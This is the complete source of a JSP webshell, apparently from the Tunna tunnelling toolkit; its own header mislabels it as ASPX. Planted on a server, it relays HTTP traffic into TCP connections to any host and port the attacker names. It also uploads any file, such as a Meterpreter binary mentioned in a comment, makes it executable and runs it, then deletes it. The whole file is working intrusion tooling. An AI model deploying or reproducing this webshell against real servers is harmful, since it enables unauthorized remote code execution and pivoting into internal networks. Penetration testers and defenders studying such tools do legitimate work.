<%@ page import="java.io.*, java.net.*, java.nio.*, java.nio.channels.*" trimDirectiveWhitespaces="true" %>
<%!
//
//Tunna ASPX webshell v0.1 (c) 2013 by Nikos Vassakis
//http://www.secforce.com / nikos.vassakis <at> secforce.com
//
public class SockException extends Exception{		//Custom exception class for socket exceptions
	public SockException(String message) {
		super(message);
	}
    public SockException(String message, Throwable throwable) {
        super(message, throwable);
    }
}
public SocketChannel connect(String ip, int port) throws SockException{
	SocketChannel socket;
	boolean established;
	try{
		socket = SocketChannel.open();	//Create socket
	}catch(IOException e){
		throw new SockException("[SERVER] Unable to create Socket");
	}
	try{
		established = socket.connect(new InetSocketAddress(ip, port));	//Connect to socket
	}catch( IOException e){
		throw new SockException("[Server] Unable to Connect");
	}
	try{
		socket.configureBlocking(false);		//Socket in non-blocking mode because of the consecutive HTTP requests
	}catch( IOException e){
		throw new SockException("[Server] Unable to set socket to non blocking mode");
	}
	if (!established){
		try{
			while(! socket.finishConnect() ){
			//wait for connection
			}
		}
		catch( IOException e){
			throw new SockException("[Server] Unable connect to socket");
		}
	}
	return socket;
}
%>
<%
SocketChannel socket=null;
OutputStream os = response.getOutputStream();
if(request.getParameter("proxy") == "" ){
	//Irrelevant: 	in windows after 1024, bytes are not written to socket
	//				in linux same happend after 4096
	int bufferSize = 8192; //4096 //8192
	if (request.getParameter("close") == ""){	//if url parameter close is received: close socket / invalidate session
		session.setAttribute("running","-1");	
		socket=(SocketChannel)session.getAttribute("socket");	//get socket from session
		if (socket != null){
			socket.close();
			}
		os.write("[Server] Closing the connection".getBytes());
		os.flush();
		os.close();
		session.invalidate();	//invalidate session
		return;
	}
	if(request.getParameter("port") != null){	//if port is specified connects to that port
		session.setAttribute("port", request.getParameter("port"));
		}
	if(request.getParameter("ip") != null){	//if ip is specified connects to that ip
		session.setAttribute("ip", request.getParameter("ip"));
		}
/*	SESSION	*/
	if(session.isNew()){							//1st request: initiate session
		session.setAttribute("running", "0");		
		os.write("[Server] All good to go, ensure the listener is working ;-)\n".getBytes());
		os.flush();
		os.close();// *important* to ensure no more jsp output
		return;
	}
	else{
		if (session.getAttribute("running") == "0" ){	//2nd request: get configuration options for socket
			String ip = (String) session.getAttribute("ip");
			int port = Integer.parseInt((String) session.getAttribute("port"));
			try{
				socket=connect(ip, port);
			}
			catch(SockException e){
				os.write(e.getMessage().getBytes());
				os.flush();
				os.close();
				return;
			}
			session.setAttribute("socket",socket);
			session.setAttribute("running", "1");
			os.write("[OK]".getBytes());			//Send [OK] back
			os.flush();
			os.close();// *important* to ensure no more jsp output
			return;
			}
		else{
			response.setContentType("application/oclet-stream");
			//Allocate buffers for socket IO
			ByteBuffer dataIn = ByteBuffer.allocate(bufferSize);		
			ByteBuffer dataOut = ByteBuffer.allocate(bufferSize);
			
			try{
				socket=(SocketChannel)session.getAttribute("socket");	//Get socket from session
			}catch(Exception e){
				os.write("[Server] Socket null pointer exception".getBytes());
				os.flush();
				os.close();
				return;
			}
			//Read data from request and write to socket
			InputStream is = request.getInputStream();
			byte[] postBuff = new byte[bufferSize];
			int postBytesRead = is.read(postBuff);
			if (postBytesRead > 0){
				dataIn = ByteBuffer.wrap(postBuff,0,postBytesRead);
				int bytesWritten = socket.write(dataIn);
				dataIn.clear();
			}
			//Read Data from socket and write to response
			int SocketBytesRead = socket.read(dataOut);
			if(SocketBytesRead > 0){
				byte[] respBuff = dataOut.array();
				os.write(respBuff,0,SocketBytesRead);
				os.flush();
				os.close();// *important* to ensure no more jsp output
				dataOut.clear();
				return;
				}
			else{
				os.write("".getBytes()); //No data on socket: send nothing back
				os.flush();
				os.close();
				return;
				}
			}
		}
}
if(request.getParameter("file") == "" ){	//If url parameter file is set
	if(request.getParameter("upload") == "" ){	//reads file and saves it to temp
		String contentType = request.getContentType();
		if ((contentType != null) && (contentType.indexOf("multipart/form-data") >= 0)) {
			DataInputStream in = new DataInputStream(request.getInputStream());
			int formDataLength = request.getContentLength();
			byte dataBytes[] = new byte[formDataLength];
			int byteRead = 0;
			int totalBytesRead = 0;
			while (totalBytesRead < formDataLength) {
				byteRead = in.read(dataBytes, totalBytesRead, formDataLength);
				totalBytesRead += byteRead;
				}
			String file = new String(dataBytes);
			String saveFile = file.substring(file.indexOf("filename=\"") + 10, file.lastIndexOf("Content-Type")-3);
			//String saveFile = "meterpreter.exe";
			saveFile = System.getProperty("java.io.tmpdir") + '/' + saveFile;
			session.setAttribute("file", saveFile);
			int lastIndex = contentType.lastIndexOf("=");
			String boundary = contentType.substring(lastIndex + 1,contentType.length());
			int pos;
			//extracting the index of file 
			pos = file.indexOf("filename=\"");
			pos = file.indexOf("\n", pos) + 1;
			pos = file.indexOf("\n", pos) + 1;
			pos = file.indexOf("\n", pos) + 1;
			int boundaryLocation = file.indexOf(boundary, pos) - 4;
			int startPos = ((file.substring(0, pos)).getBytes()).length;
			int endPos = ((file.substring(0, boundaryLocation)).getBytes()).length;

			// creating a new file with the same name and writing the content in new file
			//TODO: catch exception if file exists
			FileOutputStream fileOut = new FileOutputStream((String) session.getAttribute("file"));
			fileOut.write(dataBytes, startPos, (endPos - startPos));
			fileOut.flush();
			fileOut.close();
			os.write(("[Server] File Uploaded at " + (String) session.getAttribute("file")).getBytes());
			os.flush();
			os.close();
			return;
		}
	}
	if(request.getParameter("run") == "" ){		//Executes the file
		String s=(String) session.getAttribute("file");  
		if(!System.getProperty("os.name").toLowerCase().contains("windows")){ // If linux: make uploaded file executable
			try{  
				Runtime r = Runtime.getRuntime();  
				Process p =null;  
				String s1 = "chmod +x " + s;  
				p = r.exec(s1); 
			} catch(Exception e1)  
			{  
				os.write(e1.getMessage().getBytes());
				os.flush();
				os.close();
				return;
			}
		}  
		//Execute it		
		try{  
		    Runtime r = Runtime.getRuntime();  
		    Process p =null;  
		    String[] s1 = {s};
		    p = r.exec(s1);  
		} catch(Exception e1)  
		{  
			os.write(e1.getMessage().getBytes());
			os.flush();
			os.close();
			return;
		}		
			os.write(("[Server] Run").getBytes());
			os.flush();
			os.close();
	}
	if(request.getParameter("delete") == "" ){	// Url parameter to delete file
		//TODO: catch exception on file not found
		String s=(String) session.getAttribute("file"); 
		File f = new File(s);  
		f.delete(); 
	}
}
%>
